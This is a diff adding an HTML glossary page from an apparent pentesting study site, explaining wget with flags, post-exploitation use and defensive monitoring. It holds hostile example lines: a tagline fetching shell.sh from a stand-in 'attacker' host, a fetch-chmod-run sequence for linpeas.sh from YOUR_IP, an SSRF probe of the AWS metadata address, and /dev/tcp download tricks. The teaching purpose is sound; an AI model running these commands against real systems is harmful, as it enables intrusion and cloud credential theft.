@@ -1,0 +1,163 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>wget — The Command-Line Downloader ☕</title>
+<link rel="stylesheet" href="../assets/styles.css" />
+</head>
+<body data-page-slug="wget">
+
+<div class="progress-wrap"><div class="progress-bar" id="progressBar"></div></div>
+
+<div class="topbar">
+  <a class="logo" href="../index.html">☕ CYBERSEC.VAULT</a>
+  <nav>
+    <a href="../index.html">Home</a>
+    <a href="../index.html#topics-web">Topics</a>
+    <a href="index.html" class="active">Glossary</a>
+    <a href="../tryhackme/index.html">THM</a>
+  </nav>
+  <div class="search-wrap">
+    <input type="text" class="search" placeholder="Search (press /)..." />
+    <div class="search-results"></div>
+  </div>
+</div>
+
+<div class="breadcrumb">
+  <a href="../index.html">Home</a>
+  <span class="sep">›</span>
+  <a href="index.html">Glossary</a>
+  <span class="sep">›</span>
+  <span>wget</span>
+</div>
+
+<section class="hero" style="min-height: 45vh;">
+  <div class="hero-content">
+    <span class="coffee-badge">📖 glossary · linux · the pentester's pigeon</span>
+    <h1 style="font-family: var(--mono);">wget <span style="color: var(--accent-2);">⬇️</span></h1>
+    <p class="subtitle">Download files over HTTP/HTTPS from the command line. No browser, no GUI, no excuses.<br>The command every pentester has muscle-memory for.</p>
+    <div class="tagline">"wget http://attacker/shell.sh — 12 bytes later, you own the box." 🐚</div>
+  </div>
+</section>
+
+<section class="chapter">
+  <div class="chapter-num">Chapter 01 // Definition</div>
+  <h2><span class="emoji">📖</span> What is wget?</h2>
+  <p class="lead"><strong>wget</strong> is a non-interactive network downloader pre-installed on most Linux systems. Give it a URL; it saves the content to disk.</p>
+
+  <div class="paper">
+    <h4>📝 Think of it like a delivery pigeon</h4>
+    <p>You don't go to the store and browse shelves (that's a browser). You write down what you want, tie it to a pigeon, and it flies off, grabs the file, and drops it back at your feet. <span class="highlight">Fast, scriptable, zero-GUI.</span> Perfect for servers, automation, and — yes — post-exploit payload delivery.</p>
+  </div>
+
+  <h3>The one-liner</h3>
+  <div class="code">
+wget https://example.com/file.txt
+<span class="com"># saves file.txt in your current directory</span>
+  </div>
+
+  <h3>Useful flags</h3>
+  <div class="grid cols-2">
+    <div class="card">
+      <h4><code class="inline">-O &lt;name&gt;</code></h4>
+      <p>Save with a different filename. <code class="inline">wget URL -O shell.sh</code></p>
+    </div>
+    <div class="card">
+      <h4><code class="inline">-q</code></h4>
+      <p>Quiet mode. No progress bar, no stderr noise. Great for scripts.</p>
+    </div>
+    <div class="card">
+      <h4><code class="inline">-c</code></h4>
+      <p>Continue a partially downloaded file. Resume broken transfers.</p>
+    </div>
+    <div class="card">
+      <h4><code class="inline">--no-check-certificate</code></h4>
+      <p>Skip TLS cert validation. Handy for self-signed or expired certs on CTF boxes.</p>
+    </div>
+  </div>
+</section>
+
+<div class="divider">the security angle</div>
+
+<section class="chapter">
+  <div class="chapter-num">Chapter 02 // Post-exploit uses</div>
+  <h2><span class="emoji">🥷</span> Why wget is on every pentester's cheat sheet</h2>
+
+  <p class="lead">After you land on a target, you usually need to pull <em>more tools</em> onto the box — privesc scripts, enumeration binaries, reverse shell payloads. wget is the simplest way.</p>
+
+  <div class="code">
+<span class="com"># On your attacker box</span>
+python3 -m http.server 8000
+
+<span class="com"># On the victim box (shell you just got)</span>
+wget http://YOUR_IP:8000/linpeas.sh -O /tmp/lp.sh
+chmod +x /tmp/lp.sh
+/tmp/lp.sh
+  </div>
+
+  <div class="callout info">
+    <strong>💡 The SSRF bonus:</strong> wget is also a classic tool for testing <span class="term" data-term="ssrf">SSRF</span>. If a web app gives you URL-fetching, feed it <code class="inline">http://169.254.169.254/latest/meta-data/</code> (AWS metadata) and see what comes back.
+  </div>
+
+  <h3>Alternatives when wget isn't there</h3>
+  <div class="grid cols-3">
+    <div class="card">
+      <h4>🌀 <code class="inline">curl -O URL</code></h4>
+      <p>The other mega-common HTTP client. Usually installed alongside wget.</p>
+    </div>
+    <div class="card">
+      <h4>🐍 Python one-liner</h4>
+      <div class="code" style="font-size: 11px;">python3 -c "import urllib.request;urllib.request.urlretrieve('URL','out')"</div>
+    </div>
+    <div class="card">
+      <h4>🔌 Bash's /dev/tcp</h4>
+      <p>Minimal boxes sometimes lack both. Craft HTTP over raw TCP via <code class="inline">exec 3&lt;&gt;/dev/tcp/host/80</code>.</p>
+    </div>
+  </div>
+</section>
+
+<section class="chapter">
+  <div class="chapter-num">Chapter 03 // Defender's angle</h2>
+  <h2><span class="emoji">🛡️</span> Spot wget abuse on YOUR server</h2>
+  <p>If your web server shouldn't be making outbound HTTP requests, but <span class="term" data-term="log-file">logs</span> show wget firing off to random IPs — that's probably an attacker pulling in tooling. Defensive moves:</p>
+  <ul>
+    <li>Egress filtering — block outbound HTTP from production servers by default.</li>
+    <li>Monitor <code class="inline">auditd</code> or <code class="inline">execve</code> events for wget/curl invocations by service users.</li>
+    <li>Remove wget from containers and minimal images.</li>
+  </ul>
+
+  <div class="quiz">
+    <h4>🎯 Quick Check</h4>
+    <div class="q">You need to download <code class="inline">enum.sh</code> from your server at <code class="inline">10.10.1.5:8080</code> onto the target, saving it as <code class="inline">/tmp/e.sh</code>. Which command?</div>
+    <div class="options">
+      <div class="opt" onclick="quizAnswer(this, false)">wget 10.10.1.5:8080/enum.sh /tmp/e.sh</div>
+      <div class="opt" onclick="quizAnswer(this, true)">wget http://10.10.1.5:8080/enum.sh -O /tmp/e.sh</div>
+      <div class="opt" onclick="quizAnswer(this, false)">wget --save /tmp/e.sh 10.10.1.5:8080/enum.sh</div>
+      <div class="opt" onclick="quizAnswer(this, false)">wget /tmp/e.sh &lt; http://10.10.1.5:8080/enum.sh</div>
+    </div>
+    <div class="feedback"></div>
+  </div>
+</section>
+
+<section class="chapter">
+  <div class="related-terms">
+    <h4>🔗 Related in the vault</h4>
+    <div class="tags">
+      <a href="scp.html">📤 scp</a>
+      <a href="ssh.html">🔐 SSH</a>
+      <a href="reverse-shell.html">🐚 Reverse Shell</a>
+      <a href="ssrf.html">🌐 SSRF</a>
+      <a href="../tryhackme/cybersec-101/linux-fundamentals-part-3.html">🐧 THM: Linux Fundamentals Pt. 3</a>
+    </div>
+  </div>
+</section>
+
+<footer class="site-foot">
+  <p class="coffee-line">Download. Execute. Escalate. Repeat. ☕</p>
+</footer>
+
+<script src="../assets/glossary.js"></script>
+<script src="../assets/app.js"></script>
+</body>
+</html>
